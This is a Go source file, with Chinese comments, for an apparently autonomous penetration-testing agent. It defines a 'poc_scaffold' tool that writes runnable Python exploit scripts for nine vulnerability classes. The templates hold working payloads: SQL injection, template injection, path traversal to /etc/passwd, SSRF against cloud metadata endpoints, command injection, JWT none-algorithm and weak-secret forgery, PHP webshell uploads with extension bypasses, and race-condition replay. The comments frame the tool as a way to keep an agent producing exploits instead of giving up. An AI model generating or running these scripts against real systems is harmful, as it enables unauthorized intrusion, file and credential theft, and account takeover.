package agent

// PoC 脚手架（v0.7.0）：poc_scaffold。
//
// ## 为什么需要它
//
// 客户反馈的核心是「到瓶颈就放弃，不会自己产出新的 PoC」。现场事实也印证：
// worker 会写零散 curl，但**不会把一次验证沉淀成可重复执行的利用脚本**——
// 换个参数就要重写一遍，失败一次就判死。
//
// 本工具按漏洞类别直接生成一个**可运行**的 Python 骨架：基线对照、载荷列表、
// 命中判据、多线程/多身份模板都已写好，模型只需按目标实际情况改 URL/参数/
// 载荷，然后 run_script 执行。它把「构造 PoC」从每次从零开始，变成改一个模板。
//
// 骨架遵循授权测试边界：只发送请求、只回读响应，不做破坏性写操作；命中判据
// 一律是「响应差异/已知标记」，避免误报。

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"time"

	actool "github.com/Autumn-27/norma/tool"
)

const pocCommon = `#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""pojun PoC scaffold (__CLASS__) — 改这三处即可用：
   BASE  = 目标地址（可命令行覆盖 argv[1]）
   PARAM = 参数名（argv[2]）
   PAYLOADS = 载荷列表
判据：输出以 MATCH 开头的行 = 命中；最后打印 SUMMARY。
"""
import sys, ssl, json, re, time, threading, urllib.request, urllib.parse, urllib.error

BASE  = sys.argv[1] if len(sys.argv) > 1 else "__BASE__"
PARAM = sys.argv[2] if len(sys.argv) > 2 else "__PARAM__"
CTX = ssl.create_default_context(); CTX.check_hostname = False; CTX.verify_mode = ssl.CERT_NONE
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"}

def inject(base, param, payload):
    if "FUZZ" in base:
        return base.replace("FUZZ", urllib.parse.quote(payload, safe=""))
    u = urllib.parse.urlsplit(base)
    q = urllib.parse.parse_qsl(u.query, keep_blank_values=True)
    q = [(k, v) for (k, v) in q if k != param] + [(param, payload)]
    return urllib.parse.urlunsplit((u.scheme, u.netloc, u.path, urllib.parse.urlencode(q), u.fragment))

def fetch(url, method="GET", data=None, headers=None, timeout=15):
    h = dict(UA); h.update(headers or {})
    body = data.encode("utf-8", "replace") if isinstance(data, str) else data
    req = urllib.request.Request(url, data=body, method=method, headers=h)
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=CTX) as r:
            return r.status, dict(r.headers), r.read(2_000_000), int((time.time()-t0)*1000)
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers or {}), e.read(1_000_000), int((time.time()-t0)*1000)
    except Exception as e:
        return 0, {}, str(e).encode(), int((time.time()-t0)*1000)

def show(label, status, body, ms):
    txt = body.decode("utf-8", "replace") if isinstance(body, bytes) else str(body)
    print(json.dumps({"probe": label, "status": status, "ms": ms, "len": len(txt), "head": txt[:300]}, ensure_ascii=False))

def finish(hits, total):
    print("SUMMARY hits=%d total=%d" % (len(hits), total))
    if not hits:
        print("[!] 无命中：先确认基准请求可达（status>0），再换编码/换参数位置/换载荷来源；不要据此判死。")
`

var pocTemplates = map[string]string{
	"sqli": `BASE_T = BASE
PAYLOADS = ["'", "\"", "')", "') OR '1'='1", "' OR '1'='1' -- -", "\" OR \"1\"=\"1", "1' AND SLEEP(3)-- -", "1) AND SLEEP(3)-- -"]
# 预期运行：python3 本文件 <url> <param> [--post]
POST = "--post" in sys.argv
hits = []
base_s, _, base_b, _ = (fetch(BASE, "POST", "x=1") if POST else fetch(BASE))
for p in PAYLOADS:
    url = inject(BASE_T, PARAM, p)
    st, _, bd, ms = (fetch(BASE_T, "POST", "%s=%s" % (PARAM, urllib.parse.quote(p))) if POST else fetch(url))
    show(p, st, bd, ms)
    low = bd.decode("utf-8", "replace").lower() if isinstance(bd, bytes) else str(bd).lower()
    sigs = ["sql syntax", "mysql_fetch", "ora-0", "postgresql", "unclosed quotation", "syntax error", "odbc", "jdbc"]
    if st in (500, 502) or any(s in low for s in sigs):
        hits.append(("error-based", p)); print("MATCH error-based payload=%r status=%s" % (p, st))
    elif "sleep" in p.lower() and ms >= 2500:
        hits.append(("time-based", p)); print("MATCH time-based payload=%r ms=%s" % (p, ms))
    elif len(low) > 0 and abs(len(low) - len(base_b.decode("utf-8","replace"))) > 80:
        hits.append(("bool-diff", p)); print("MATCH boolean-diff payload=%r len=%d base=%d" % (p, len(low), len(base_b)))
finish(hits, len(PAYLOADS))
`,
	"ssti": `PAYLOADS = ["{{7*7}}", "{{7*'7'}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "@(7*7)", "{{config}}", "{{''.__class__.__mro__}}"]
hits = []
for p in PAYLOADS:
    st, _, bd, ms = fetch(inject(BASE, PARAM, p))
    show(p, st, bd, ms)
    low = bd.decode("utf-8", "replace") if isinstance(bd, bytes) else str(bd)
    if "49" in low or "7*7" in low and "7777777" in low:
        hits.append(p); print("MATCH ssti payload=%r status=%s" % (p, st))
    if "class" in low and "__mro__" in p:
        hits.append(p); print("MATCH ssti-class payload=%r" % p)
finish(hits, len(PAYLOADS))
`,
	"lfi": `PATHS = ["../../../../etc/passwd", "....//....//....//etc/passwd", "..%2f..%2f..%2f..%2fetc/passwd", "/etc/passwd%00", "..\..\..\..\windows\win.ini", "php://filter/convert.base64-encode/resource=index.php"]
hits = []
for p in PATHS:
    st, _, bd, ms = fetch(inject(BASE, PARAM, p))
    show(p, st, bd, ms)
    low = bd.decode("utf-8", "replace") if isinstance(bd, bytes) else str(bd)
    if "root:x:0:0" in low or "[extensions]" in low.lower():
        hits.append(p); print("MATCH lfi payload=%r status=%s" % (p, st))
finish(hits, len(PATHS))
`,
	"ssrf": `# 先用你自己的回连/HTTP 日志地址替换 CANARY；元数据地址只做只读 GET
CANARY = "http://127.0.0.1:9/pojun-ssrf-canary"
TARGETS = [CANARY, "http://169.254.169.254/latest/meta-data/", "http://metadata.google.internal/computeMetadata/v1/", "http://100.100.100.200/latest/meta-data/", "file:///etc/passwd", "gopher://127.0.0.1:6379/_PING"]
hits = []
for p in TARGETS:
    st, hd, bd, ms = fetch(inject(BASE, PARAM, p))
    show(p, st, bd, ms)
    low = bd.decode("utf-8", "replace") if isinstance(bd, bytes) else str(bd)
    if st and (("ami-" in low) or ("computeMetadata" in low) or ("root:x:0:0" in low) or ("redis" in low.lower())):
        hits.append(p); print("MATCH ssrf payload=%r status=%s" % (p, st))
finish(hits, len(TARGETS))
`,
	"idor": `# 用法：python3 本文件 <url含FUZZ或带param> <param> <id1> <id2>
# 两个 id 用同一身份访问，比较状态码/长度/关键字段；差异=可枚举越权线索（还需换成他人对象复核）。
ID1 = sys.argv[3] if len(sys.argv) > 3 else "1"
ID2 = sys.argv[4] if len(sys.argv) > 4 else "2"
hits = []
outs = {}
for ident in (ID1, ID2):
    st, _, bd, ms = fetch(inject(BASE, PARAM, ident))
    txt = bd.decode("utf-8", "replace") if isinstance(bd, bytes) else str(bd)
    outs[ident] = (st, txt)
    show("id=" + ident, st, bd, ms)
s1, t1 = outs[ID1]; s2, t2 = outs[ID2]
if s1 == 200 and s2 == 200 and t1 != t2:
    hits.append("both-200-diff"); print("MATCH idor ids=%s,%s len=%d/%d" % (ID1, ID2, len(t1), len(t2)))
elif s1 in (401,403) and s2 == 200:
    hits.append("auth-diff"); print("MATCH idor 一个被拒一个成功 ids=%s,%s" % (ID1, ID2))
finish(hits, 2)
`,
	"jwt": `import base64, hmac, hashlib
TOKEN = sys.argv[3] if len(sys.argv) > 3 else ""
def b64d(s):
    s += "=" * (-len(s) % 4); return base64.urlsafe_b64decode(s)
def b64e(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
print("[*] token 长度=%d" % len(TOKEN))
try:
    h, p, sig = TOKEN.split(".")
    print("[*] header=", b64d(h).decode("utf-8","replace"))
    print("[*] payload=", b64d(p).decode("utf-8","replace"))
except Exception as e:
    print("[!] token 不像 JWT：", e)
    sys.exit(0)
# none 算法
for alg in ("none", "None", "NONE"):
    forged = b64e(json.dumps({"alg": alg, "typ": "JWT"}).encode()) + "." + p + "."
    st, _, bd, ms = fetch(BASE, headers={"Authorization": "Bearer " + forged})
    show("alg=" + alg, st, bd, ms)
    if st == 200:
        print("MATCH jwt-none alg=%s" % alg)
# 弱密钥
SECRETS = ["secret", "password", "123456", "jwt", "changeme", "key", "test", "admin", "pojun"]
hits = []
for sec in SECRETS:
    s = b64e(hmac.new(sec.encode(), (h + "." + p).encode(), hashlib.sha256).digest())
    st, _, bd, ms = fetch(BASE, headers={"Authorization": "Bearer " + h + "." + p + "." + s})
    if st == 200:
        hits.append(sec); print("MATCH jwt-weak-secret secret=%r" % sec)
finish(hits, len(SECRETS))
`,
	"upload": `# 用法：python3 本文件 <upload_url> <param> [shell_content]
UPLOAD = BASE
FIELD = PARAM
SHELL = sys.argv[3] if len(sys.argv) > 3 else "<?php echo 'pojun'; ?>"
BOUND = "----pojun%d" % int(time.time())
NAMES = ["poc.php", "poc.php.jpg", "poc.php%00.jpg", "poc.pHp", "poc.php5", ".htaccess"]
hits = []
for name in NAMES:
    parts = []
    for k, v in (("name", name), ("content", SHELL)):
        parts.append('--%s\r\nContent-Disposition: form-data; name="%s"\r\n\r\n%s\r\n' % (BOUND, k, v))
    parts.append('--%s\r\nContent-Disposition: form-data; name="%s"; filename="%s"\r\nContent-Type: application/octet-stream\r\n\r\n%s\r\n' % (BOUND, FIELD, name, SHELL))
    parts.append("--%s--\r\n" % BOUND)
    body = "".join(parts).encode()
    st, hd, bd, ms = fetch(UPLOAD, "POST", body, {"Content-Type": "multipart/form-data; boundary=" + BOUND})
    show(name, st, bd, ms)
    txt = bd.decode("utf-8", "replace") if isinstance(bd, bytes) else str(bd)
    if st in (200, 201, 302) and re.search(r'(?i)(success|uploaded|上传成功|/upload|\.php)', txt):
        hits.append(name); print("MATCH upload name=%r status=%s" % (name, st))
finish(hits, len(NAMES))
print("[*] 下一步：从响应/路径规律找落地地址，http_request 访问并确认回显；不是回显型就试解析执行。")
`,
	"cmdi": `PAYLOADS = [";id", "|id", "||id", "&id", "&&id", "$(id)", "%0aid", ";whoami", "|ping -c 1 127.0.0.1"]
hits = []
for p in PAYLOADS:
    st, _, bd, ms = fetch(inject(BASE, PARAM, p))
    show(p, st, bd, ms)
    low = bd.decode("utf-8", "replace") if isinstance(bd, bytes) else str(bd)
    if re.search(r"uid=\\d+\\(", low) or re.search(r"(?i)(windows|nt authority|administrator)", low):
        hits.append(p); print("MATCH cmdi payload=%r status=%s" % (p, st))
finish(hits, len(PAYLOADS))
`,
	"race": `# 并发重放同一状态变更请求（改价/领券/提现），检查是否有 >1 次成功。
THREADS = int(sys.argv[3]) if len(sys.argv) > 3 else 20
PATH_KEY = sys.argv[4] if len(sys.argv) > 4 else PARAM
results = []
lock = threading.Lock()
def one(i):
    st, _, bd, ms = fetch(BASE, "POST", "%s=1" % PATH_KEY)
    txt = bd.decode("utf-8", "replace") if isinstance(bd, bytes) else str(bd)
    with lock:
        results.append((i, st, txt[:120]))
ths = [threading.Thread(target=one, args=(i,)) for i in range(THREADS)]
for t in ths: t.start()
for t in ths: t.join()
ok = [r for r in results if r[1] in (200, 201, 302)]
print(json.dumps({"total": len(results), "ok": len(ok), "sample": ok[:5]}, ensure_ascii=False))
if len(ok) > 1:
    print("MATCH race 并发成功 %d/%d —— 需再核对业务状态（订单/余额）确认重复生效" % (len(ok), THREADS))
else:
    print("[!] 未见并发成功；换更精确的变更接口/带正确 token/减小间隔再试。")
`,
}

func (t *ToolSet) pocScaffold() actool.CoreTool {
	classes := make([]string, 0, len(pocTemplates))
	for k := range pocTemplates {
		classes = append(classes, k)
	}
	sort.Strings(classes) // 错误提示里顺序稳定，便于模型/人对照
	return readTool(
		"poc_scaffold",
		"按漏洞类别生成一个【可运行的 Python 利用/验证骨架】并落进任务共享目录（shared/scripts），"+
			"返回脚本路径与运行命令。骨架已含基线对照、载荷列表、命中判据；你只需改 URL/参数/载荷。"+
			"类别：sqli/ssti/lfi/ssrf/idor/jwt/upload/cmdi/race。\n"+
			"这是「把验证沉淀成可重复 PoC」的入口：一次生成 → run_script 执行 → 按输出改载荷 → 再跑，"+
			"而不是每次从零手写 curl。没有命中时脚本会打印排查提示，不等于漏洞不存在。",
		obj(map[string]any{
			"vulnclass": str("漏洞类别：" + strings.Join(classes, "/")),
			"target":    str("目标地址；含 FUZZ 时替换为载荷，否则按 param 注入查询参数"),
			"param":     str("参数名（如 id / url / file / q）"),
			"name":      str("脚本文件名（可选，默认 <class>-<时间戳>.py）"),
		}, "vulnclass", "target"),
		func(_ context.Context, in json.RawMessage) (actool.Result, error) {
			var a struct {
				VulnClass string `json:"vulnclass"`
				Target    string `json:"target"`
				Param     string `json:"param"`
				Name      string `json:"name"`
			}
			_ = json.Unmarshal(in, &a)
			class := strings.ToLower(strings.TrimSpace(a.VulnClass))
			tpl, ok := pocTemplates[class]
			if !ok {
				return actool.Errorf("不支持的类别: " + class + "（可用：" + strings.Join(classes, "/") + "）"), nil
			}
			if strings.TrimSpace(a.Target) == "" {
				return actool.Errorf("target 不能为空"), nil
			}
			dir := t.sharedDir()
			if dir == "" {
				return actool.Errorf("任务共享目录不可用（runDir 未注入）"), nil
			}
			param := strings.TrimSpace(a.Param)
			if param == "" {
				param = "id"
			}
			name := sanitizeScriptName(a.Name)
			if name == "" {
				name = fmt.Sprintf("%s-%d.py", class, time.Now().Unix()%100000)
			} else if !strings.HasSuffix(strings.ToLower(name), ".py") {
				name += ".py"
			}
			header := strings.NewReplacer(
				"__CLASS__", class,
				"__BASE__", pyQuote(a.Target),
				"__PARAM__", pyQuote(param),
			).Replace(pocCommon)
			content := header + "\n" + tpl
			path := filepath.Join(dir, "scripts", name)
			if err := os.WriteFile(path, []byte(content), 0o755); err != nil {
				return actool.Errorf("写入脚本失败: " + err.Error()), nil
			}
			return jsonResult(map[string]any{
				"path":      path,
				"vulnclass": class,
				"run_with_bash": fmt.Sprintf("timeout 300 python3 %s %s %s",
					shellQuote(path), shellQuote(a.Target), shellQuote(param)),
				"note": "先跑一遍看基线与命中；按输出修改 PAYLOADS/参数位置后再次 run_script。" +
					"生成的是骨架不是成品——把它当起点，命中的判据要能写进 report_finding 的 evidence。",
			})
		},
	)
}

// pyQuote 把字符串安全嵌入 Python 单引号字面量（用于默认值）。
func pyQuote(s string) string {
	s = strings.ReplaceAll(s, `\`, `\\`)
	s = strings.ReplaceAll(s, `'`, `\'`)
	s = strings.ReplaceAll(s, "\n", `\n`)
	s = strings.ReplaceAll(s, "\r", `\r`)
	return s
}
